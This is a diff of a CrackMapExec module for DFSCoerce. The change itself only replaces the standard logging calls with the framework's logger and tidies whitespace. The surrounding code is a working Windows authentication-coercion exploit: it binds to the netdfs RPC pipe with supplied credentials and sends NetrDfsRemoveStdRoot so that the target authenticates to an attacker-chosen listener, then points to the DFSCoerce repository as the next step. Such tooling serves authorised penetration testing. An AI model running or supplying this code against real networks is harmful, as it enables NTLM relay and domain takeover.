@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import logging
 from impacket import system_errors
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
 from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.uuid import uuidtup_to_bin
+from cme.logger import cme_logger
+
 
 class CMEModule:
     
@@ -27,15 +28,16 @@ class CMEModule:
         dce = trigger.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, doKerberos=connection.kerberos, dcHost=connection.kdcHost)
 
         if dce is not None: 
-            logging.debug("Target is vulnerable to DFSCoerce")
+            context.log.debug("Target is vulnerable to DFSCoerce")
             trigger.NetrDfsRemoveStdRoot(dce, self.listener)
             context.log.highlight("VULNERABLE")
             context.log.highlight("Next step: https://github.com/Wh04m1001/DFSCoerce")
             dce.disconnect()
         
         else:
-            logging.debug("Target is not vulnerable to DFSCoerce")
-        
+            context.log.debug("Target is not vulnerable to DFSCoerce")
+
+
 class DCERPCSessionError(DCERPCException):
     def __init__(self, error_string=None, error_code=None, packet=None):
         DCERPCException.__init__(self, error_string, error_code, packet)
@@ -60,10 +62,13 @@ class NetrDfsRemoveStdRoot(NDRCALL):
         ('ApiFlags', DWORD),
     )
 
+
 class NetrDfsRemoveStdRootResponse(NDRCALL):
     structure = (
         ('ErrorCode', ULONG),
     )
+
+
 class NetrDfsAddRoot(NDRCALL):
     opnum = 12
     structure = (
@@ -72,10 +77,13 @@ class NetrDfsAddRoot(NDRCALL):
          ('Comment',WSTR),
          ('ApiFlags',DWORD),
      )
+
+
 class NetrDfsAddRootResponse(NDRCALL):
      structure = (
          ('ErrorCode', ULONG),
      )
+
 
 class TriggerAuth():
     def connect(self, username, password, domain, lmhash, nthash, target, doKerberos, dcHost):
@@ -90,31 +98,31 @@ class TriggerAuth():
         
         rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
-        logging.debug("[-] Connecting to %s" % r'ncacn_np:%s[\PIPE\netdfs]' % target)
+        cme_logger.debug("[-] Connecting to %s" % r'ncacn_np:%s[\PIPE\netdfs]' % target)
         try:
             dce.connect()
         except Exception as e:
-            logging.debug("Something went wrong, check error status => %s" % str(e))
+            cme_logger.debug("Something went wrong, check error status => %s" % str(e))
             return
         try:
             dce.bind(uuidtup_to_bin(('4FC742E0-4A10-11CF-8273-00AA004AE673', '3.0')))
         except Exception as e:
-            logging.debug("Something went wrong, check error status => %s" % str(e))
+            cme_logger.debug("Something went wrong, check error status => %s" % str(e))
             return
-        logging.debug("[+] Successfully bound!")
+        cme_logger.debug("[+] Successfully bound!")
         return dce
 
     def NetrDfsRemoveStdRoot(self, dce, listener):
-        logging.debug("[-] Sending NetrDfsRemoveStdRoot!")
+        cme_logger.debug("[-] Sending NetrDfsRemoveStdRoot!")
         try:
             request = NetrDfsRemoveStdRoot()
             request['ServerName'] = '%s\x00' % listener
             request['RootShare'] = 'test\x00'
             request['ApiFlags'] = 1
             if self.args.verbose:
-                logging.debug(request.dump())
-            #logging.debug(request.dump())
+                cme_logger.debug(request.dump())
+            # logger.debug(request.dump())
             resp = dce.request(request)
 
-        except  Exception as e:
-            logging.debug(e)
+        except Exception as e:
+            cme_logger.debug(e)
